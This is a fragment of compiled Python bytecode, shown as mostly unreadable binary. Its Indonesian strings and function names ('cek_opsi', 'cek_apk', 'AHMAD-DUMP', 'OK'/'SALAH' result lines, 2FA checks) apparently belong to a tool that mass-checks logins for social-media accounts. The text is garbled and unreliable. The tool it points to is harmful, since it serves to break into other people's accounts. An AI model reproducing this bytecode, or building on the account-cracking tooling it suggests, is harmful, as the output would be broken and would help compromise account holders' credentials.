  r9  r:  r;  r�   r<  r=  r  r>  Tr?  r�   r"  r@  rA  r�   rr   r  rB  rC  rD  rE  u2   %s➤  Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)rF  u"   %s➤ Tidak Dapat Mengecek Opsi%sr#  u   %sAHMAD %s|%s ➤ OK       %su!   %sAHMAD %s|%s ➤ SALAH       %sr�   z2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIrt   z# DONE)(r�   r/  r�   r�   r�   r�   r�   r   r   r~   r�   �
IndexErrorr^   r_   r�   rc   r�   r�   r�   rI  rH  r[   r\   r]   rB   r�   rC   rG  r�   rD   rq   r,  r.  r�   r�   rG   r�   r|   r}   r�   )rS  r�   r4  ZloveZkesrs   r0  ZbirI   r�   �headerrK  rL  rM  r�   rN  rO  rP  rQ  rR  r�   ZdahrL   rL   rM   �cek_opsi�  sr   
"
�($
"
�$
�
�
rW  c              	   C   sF  | j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr5tdt� dt� dt� d�� nt	t|��D ]}tdt
|d || �dd�tf � q;| j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr�tdt� dt� dt� d�� d S t	t|��D ]}tdt|d || �dd�tf � q�d S )Nr&  ro   rp   r�   r@  r�   )r�   c                 S   �   g | ]}|j �qS rL   �rD   �r  �irL   rL   rM   r  1  �    zcek_apk.<locals>.<listcomp>Zh3r   z
 r�   �!z-] opshh tidak ada aplikasi aktif di akun ini.z   %s%s. %s%sr   zDitambahkan padaz Ditambahkan padar%  c                 S   rX  rL   rY  rZ  rL   rL   rM   r  :  r\  z2] opshh tidak ada aplikasi kadaluarsa di akun ini.ZKedaluwarsaz Kedaluwarsa)rC   rD   r   r�   r�   r�   r   r(   r'   r�   r"   r�   r%   )r3  ro   r   rG  r�   Zgamer[  rL   rL   rM   �cek_apk-  s"   
&
 &�r^  �__main__zgit pullr�   r�   z/sdcard/AHMAD-DUMPztouch .prox.txtr�   )�rB   Zbs4rw   rf   r[   r�   Zdatetimer^   rE   Zurllib3Zrich�base64Z
rich.tabler   �meZrich.consoler   r   r   rG  r�   Zconcurrent.futuresr   r  r   ZgpZ
rich.panelr   r�   r   r�   Zrich.markdownr	   r~   Zrich.columnsr
   r�   Zrprintr   Z	rich.textr   Ztekz�ImportErrorrg   Z	stdiomask�installZCONr*  r@   Zcokbrutr�   r�   ZprincprC   rD   r+  r=   rH   r�   ra   r�   ZxdrJ   Z	randranger�   rS  �d�fr�   r�   r[  �jr�   rN   rA   rK   r�   �lZuaku2r�   Zuakrs   r�   r'  r  r  r/  Zoprekr�   Z	lisensikur�   rv   r�   Zlisensikunir�   r�   r*   r'   r"   r%   r   r/   r)   r(   r4   Zsirr�   rH  rc   rI  r1  rk   ZdicZdic2ZnowZdayZtglrG   ZmonthZblnZyearZthnr   r  rb   rd   re   ri   rl   rh   r{   r�   r�   ry   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  rT  rW  r^  �__name__�mkdirr_   rL   rL   rL   rM   �<module>   sH  H��
���<
B>8
((b0(B5FF9


�